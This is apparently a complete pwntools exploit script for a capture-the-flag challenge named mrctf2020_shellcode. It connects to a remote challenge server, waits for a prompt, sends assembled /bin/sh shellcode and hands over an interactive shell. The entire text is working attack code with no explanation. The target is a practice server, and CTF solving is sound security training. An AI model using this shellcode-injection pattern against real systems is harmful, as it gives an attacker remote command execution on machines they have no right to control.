from pwn import *

context(arch="amd64", os="linux", log_level="debug")

# r = process("./mrctf2020_shellcode")
r = remote("node4.buuoj.cn", 27421)
r.recvuntil(b"!\n")
r.send(asm(shellcraft.sh()))
r.interactive()
